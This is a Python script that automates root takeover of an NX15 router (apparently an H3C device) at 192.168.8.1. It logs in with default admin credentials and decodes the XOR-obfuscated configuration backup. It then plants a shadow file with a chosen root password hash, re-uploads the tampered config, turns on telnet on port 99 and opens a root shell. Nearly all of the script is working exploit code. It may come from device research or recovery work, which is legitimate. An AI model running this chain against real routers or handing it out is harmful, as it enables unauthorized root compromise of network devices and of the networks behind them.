#!/usr/bin/env python3
import hashlib
import requests
import socket
import tarfile
import time
from pathlib import Path
import shutil

BASE = 'http://192.168.8.1'
HOST = '192.168.8.1'
SCRIPT_DIR = Path(__file__).resolve().parent
NX15R017_DIR = SCRIPT_DIR.parent
RUNTIME_ROOT = NX15R017_DIR / '04_middle_file' / '48_shell_recover_runtime'
WORK = RUNTIME_ROOT / 'work'
BACKUP_DIR = RUNTIME_ROOT / 'backup'
ROOT_PASSWORD = 'admin123'
ROOT_HASH = '$1$KEKJV2R0$MvyfCv8MR6g364HPiH01N0'
IAC=255; DONT=254; DO=253; WONT=252; WILL=251


def wait_port(port, timeout=180):
    end = time.time() + timeout
    while time.time() < end:
        s = socket.socket(); s.settimeout(2)
        try:
            s.connect((HOST, port))
            s.close(); return True
        except Exception:
            time.sleep(3)
        finally:
            try: s.close()
            except: pass
    return False


def login_web(password='admin123'):
    r = requests.post(BASE + '/api/login/auth', json={'username':'admin','password':password}, timeout=10)
    r.raise_for_status()
    j = r.json()
    if j.get('code') != 0:
        raise RuntimeError(f'web login failed: {j}')
    return j['data']['session']


def xor55(data: bytes) -> bytes:
    return bytes(b ^ 0x55 for b in data)


def fetch_and_decode_current_backup(session):
    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    headers={'AUTHENTICATION':session,'Content-Type':'application/json'}
    payload=[{'object':'esps.system','method':'backupprofile','id':1,'param':{}}]
    r=requests.post(BASE+'/api/esps',headers=headers,data=__import__('json').dumps(payload),timeout=30)
    j=r.json()
    path=j[0]['result']['data']['profile']
    raw=requests.get(BASE+path,timeout=30).content
    enc=BACKUP_DIR/'NX15.cfg'
    enc.write_bytes(raw)
    dec=BACKUP_DIR/'decoded'
    if dec.exists(): shutil.rmtree(dec)
    dec.mkdir()
    outer_bin=dec/'NX15_xor55.bin'
    outer_bin.write_bytes(xor55(raw))
    outer_dir=dec/'outer'; outer_dir.mkdir()
    with tarfile.open(outer_bin,'r:gz') as tf:
        tf.extractall(outer_dir)
    inner_tar=outer_dir/'NX15.tar.gz'
    inner_dir=dec/'inner_cfg'; inner_dir.mkdir()
    with tarfile.open(inner_tar,'r:gz') as tf:
        tf.extractall(inner_dir)
    return inner_dir/'mnt'


def build_shadow_sample_pkg(cfg_base: Path):
    if WORK.exists():
        shutil.rmtree(WORK)
    WORK.mkdir(parents=True)
    shutil.copytree(cfg_base, WORK / 'mnt')
    etcdir = WORK / 'etc'
    etcdir.mkdir()
    (etcdir / 'shadow.sample').write_text(
        f"root:{ROOT_HASH}:14587:0:99999:7:::\n"
        "nobody:*:14495:0:99999:7:::\n"
    )
    inner = WORK / 'NX15.tar.gz'
    with tarfile.open(inner, 'w:gz') as tf:
        tf.add(WORK / 'mnt', arcname='mnt')
        tf.add(etcdir / 'shadow.sample', arcname='etc/shadow.sample')
    md5_inner = hashlib.md5(inner.read_bytes()).hexdigest()
    info = WORK / 'NX15.info'
    info.write_text('NX15V100R017\n' + md5_inner + '\n')
    outer = WORK / 'NX15_org.cfg'
    with tarfile.open(outer, 'w:gz') as tf:
        tf.add(info, arcname='NX15.info')
        tf.add(inner, arcname='NX15.tar.gz')
    enc = WORK / 'NX15_shadowsample.cfg'
    enc.write_bytes(xor55(outer.read_bytes()))
    return enc


def upload_and_import(session, pkg: Path):
    md5 = hashlib.md5(pkg.read_bytes()).hexdigest()
    size = pkg.stat().st_size
    up_url = f"{BASE}/api/upload?type=cfg&chkSum={md5}&fileSize={size}&fileName=NX15.cfg"
    headers_bin = {'AUTHENTICATION': session, 'Content-Type': 'application/octet-stream'}
    r = requests.post(up_url, data=pkg.read_bytes(), headers=headers_bin, timeout=60)
    print('[+] upload:', r.text)
    try:
        r = requests.post(
            BASE + '/api/esps',
            json=[{'id':1,'object':'esps.system','method':'importprofile','param':{'chkSum':md5,'path':'/tmp/NX15.cfg'}}],
            headers={'AUTHENTICATION': session},
            timeout=15,
        )
        print('[+] import:', r.text)
    except Exception as e:
        print('[+] import disconnect (expected reboot):', e)


def enable_telnet(session: str):
    payload = [{'id': 1, 'object': 'esps.system.telnet', 'method': 'get', 'param': {}}]
    r = requests.post(BASE + '/api/esps', json=payload, headers={'AUTHENTICATION': session}, timeout=15)
    print('[+] telnet get:', r.text)
    try:
        status = r.json()[0]['result']['data']['status']
    except Exception:
        status = None

    if status != 'enable':
        payload = [{'id': 1, 'object': 'esps.system.telnet', 'method': 'set', 'param': {'status': 'enable'}}]
        r = requests.post(BASE + '/api/esps', json=payload, headers={'AUTHENTICATION': session}, timeout=15)
        print('[+] telnet set enable:', r.text)


def get_clean(sock):
    data = sock.recv(4096)
    i = 0
    clean = b''
    while i < len(data):
        if data[i] == IAC and i + 2 < len(data):
            cmd, opt = data[i+1], data[i+2]
            if cmd == DO:
                sock.sendall(bytes([IAC, WONT, opt]))
            elif cmd == WILL:
                sock.sendall(bytes([IAC, DONT, opt]))
            i += 3
        else:
            clean += bytes([data[i]])
            i += 1
    return clean.decode('latin1', 'ignore')


def recv_telnet(s, timeout=1.0):
    end=time.time()+timeout
    buf=''
    while time.time()<end:
        try:
            chunk=get_clean(s)
            if chunk:
                buf += chunk
        except Exception:
            break
    return buf


def wait_for(s, patterns, timeout=15):
    buf=''
    end=time.time()+timeout
    pats=[p.lower() for p in patterns]
    while time.time()<end:
        chunk=recv_telnet(s,1)
        if chunk:
            buf += chunk
            low=buf.lower()
            if any(p in low for p in pats):
                return buf
    return buf


def looks_like_shell(text: str) -> bool:
    low = text.lower().rstrip()
    return 'root@nx15:' in low or 'busybox v' in low or low.endswith('#') or low.endswith('$')


def acquire_root_shell():
    s=socket.create_connection((HOST,99),timeout=5)
    s.settimeout(1)
    print(wait_for(s,['login:'],10))
    s.sendall(b'H3C\n')
    print(wait_for(s,['password:'],10))
    s.sendall(b'nottherightpass\n')
    print(wait_for(s,['nx15 login:','login incorrect'],15))
    s.sendall(b'root\n')
    banner=wait_for(s,['password:','#','busybox','root@nx15:'],15)
    print(banner)
    if not looks_like_shell(banner):
        s.sendall((ROOT_PASSWORD+'\n').encode())
        banner=wait_for(s,['#','busybox','root@nx15:'],15)
        print(banner)
    s.sendall(b'id\n')
    time.sleep(0.8)
    print(recv_telnet(s,1.5))
    return s


def main():
    if not wait_port(80, 180):
        raise SystemExit('web not reachable')
    session = login_web()
    cfg_base = fetch_and_decode_current_backup(session)
    print('[+] current cfg base:', cfg_base)
    pkg = build_shadow_sample_pkg(cfg_base)
    print('[+] built package:', pkg)
    upload_and_import(session, pkg)
    if not wait_port(80, 240):
        raise SystemExit('web did not return after import')
    if not wait_port(99, 15):
        print('[*] telnet 99 not up after reboot, re-enabling via esps.system.telnet')
        session = login_web()
        enable_telnet(session)
        if not wait_port(99, 30):
            raise SystemExit('telnet 99 did not appear even after enabling')
    sock = acquire_root_shell()
    print('[+] root shell acquired')
    sock.close()


if __name__ == '__main__':
    main()
